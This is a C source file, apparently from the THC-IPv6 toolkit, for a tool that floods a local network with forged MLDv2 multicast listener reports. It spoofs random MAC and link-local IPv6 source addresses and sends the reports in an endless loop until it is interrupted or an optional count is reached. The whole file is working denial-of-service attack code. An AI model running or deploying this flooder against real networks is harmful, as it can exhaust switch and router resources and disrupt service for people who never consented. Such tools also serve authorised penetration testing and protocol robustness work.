#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/wait.h>
#include <time.h>
#include <pcap.h>
#include "thc-ipv6.h"

#define RECORD_NUMBER ((1500 - 40 - 6 - 8) / (4 + 16 + 16))

void help(char *prg) {
  printf("%s %s (c) 2020 by %s %s\n\n", prg, VERSION, AUTHOR, RESOURCE);
  printf("Syntax: %s interface [target] [max_count]\n\n", prg);
  printf("Flood the local network with MLDv2 reports.\n");
  //  printf("Use -r to use raw mode.\n\n");
  exit(-1);
}

int main(int argc, char *argv[]) {
  char *         interface, mac[6] = "";
  unsigned char *mac6 = mac, *ip6 = thc_resolve6("fe80::ff:fe00:0");
  unsigned char  buf[6], buf2[RECORD_NUMBER * (4 + 16 + 16)];
  unsigned char *dst = thc_resolve6("ff02::16"),
                *dstmac = thc_get_multicast_mac(dst);
  int            i, j, prefer = PREFER_LINK;
  unsigned char *pkt = NULL;
  int            pkt_len = 0;
  int            rawmode = 0;
  int            count = 0, max_count;

  if (argc < 2 || argc > 4 || strncmp(argv[1], "-h", 2) == 0) help(argv[0]);

  if (strcmp(argv[1], "-r") == 0) {
    thc_ipv6_rawmode(1);
    rawmode = 1;
    argv++;
    argc--;
  }

  srand(time(NULL) + getpid());
  setvbuf(stdout, NULL, _IONBF, 0);

  interface = argv[1];
  if (thc_get_own_mac(interface) == NULL) {
    fprintf(stderr, "Error: invalid interface %s\n", interface);
    exit(-1);
  }
  if (argc > 2) {
    if ((dst = thc_resolve6(argv[2])) == NULL) {
      fprintf(stderr, "Error: can not resolve %s\n", argv[2]);
      exit(-1);
    }
    if (dst[0] >= 0x20 && dst[0] <= 0xfd) {
      prefer = PREFER_GLOBAL;
      ip6 = thc_get_own_ipv6(interface, dst, PREFER_GLOBAL);
    }
  }
  if (argc > 3)
    sscanf(argv[3], "%d", &max_count);
  else
    max_count = 0;

  mac[0] = 0x00;
  mac[1] = 0x18;
  ip6[9] = mac[1];
  memset(buf, 0, sizeof(buf));
  buf[0] = 5;
  buf[1] = 2;
  memset(buf2, 0, sizeof(buf2));
  for (i = 0; i < RECORD_NUMBER; i++) {
    buf2[0 + i * 36] = 3;  // CHANGE_TO_INCLUDE_MODE
    buf2[3 + i * 36] = 1;
    buf2[4 + i * 36] = 0xff;
    buf2[5 + i * 36] = 0x0d;
    memcpy(buf2 + 20 + i * 36, ip6, 16);
  }

  printf(
      "Starting to flood network with MLDv2 reports on %s (Press Control-C to "
      "end, a dot is printed for every 1000 packets):\n",
      interface);
  while (1) {
    for (i = 0; i < 4; i++)
      mac[2 + i] = rand() % 256;

    //    ip6[9] = mac[1];
    ip6[10] = mac[2];
    ip6[13] = mac[3];
    ip6[14] = mac[4];
    ip6[15] = mac[5];

    for (i = 0; i < RECORD_NUMBER; i++) {
      for (j = 0; j < 6; j++)
        buf2[14 + j + i * 36] = rand() % 256;
      memcpy(buf2 + 29 + i * 36, ip6 + 9, 7);
    }
    count++;

    if ((pkt = thc_create_ipv6_extended(interface, PREFER_LINK, &pkt_len, ip6,
                                        dst, 1, 0, 0, 0, 0)) == NULL)
      return -1;
    if (thc_add_hdr_hopbyhop(pkt, &pkt_len, buf, 6) < 0) return -1;
    if (thc_add_icmp6(pkt, &pkt_len, ICMP6_MLD2_REPORT, 0, RECORD_NUMBER, buf2,
                      sizeof(buf2), 0) < 0)
      return -1;
    if (thc_generate_and_send_pkt(interface, mac6, dstmac, pkt, &pkt_len) < 0) {
      //      fprintf(stderr, "Error sending packet no. %d on interface %s: ",
      //      count, interface); perror(""); return -1;
      printf("!");
    }

    pkt = thc_destroy_packet(pkt);
    //    usleep(1);
    if (count % 1000 == 0) printf(".");
    if (max_count && count == max_count) return 0;
  }
  return 0;
}
